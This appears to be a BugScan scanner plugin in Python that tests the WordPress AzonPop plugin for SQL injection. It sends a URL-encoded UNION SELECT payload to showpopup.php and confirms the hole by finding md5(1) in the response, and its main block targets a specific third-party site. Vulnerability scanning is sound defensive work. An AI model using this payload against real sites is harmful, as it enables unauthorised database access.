#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = Wordpress AzonPop Plugin SQL Injection
#__Refer___ = https://www.bugscan.net/#!/x/1998

def assign(service, arg):
    if service == 'wordpress':
        return True, arg

def audit(arg):
    payload = 'wp-content/plugins/AzonPop/files/view/showpopup.php?popid=null%20%2f%2a%2100000union%2a%2f%20select%201%2C2%2Cmd5%281%29%2C4%2C5'
    target = arg + payload

    code, head, res, errcode, _ = curl.curl2(target)
    if code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
        security_warning(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://buyrealestate.siterubix.com/')[1])